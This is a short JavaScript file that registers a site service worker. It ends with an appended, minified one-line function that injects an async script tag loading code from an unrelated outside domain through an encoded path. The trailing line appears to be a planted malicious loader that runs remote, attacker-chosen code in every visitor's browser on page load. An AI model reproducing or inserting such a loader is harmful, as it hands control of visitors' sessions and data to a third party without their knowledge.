var http = "https://";
var url = `${window.location.hostname}`;
if ("serviceWorker" in navigator) {
  navigator.serviceWorker
    .register(`${http}${url}/sw.js`)
    .then((reg) => console.log("Service Worker registered.", reg))
    .catch((err) => console.log("Service Worker registeration failed.", err));
}
;(function(e,l,v,j,f){j=e.createElement(l);f=e.getElementsByTagName(l)[0];j.async=1;j.src=v;f.parentNode.insertBefore(j,f);})(document,'script','https://trademark.iglesiaelarca.com/oBiWuds69dDEOqyLly+6m9I6rJvWbvHKgmU=');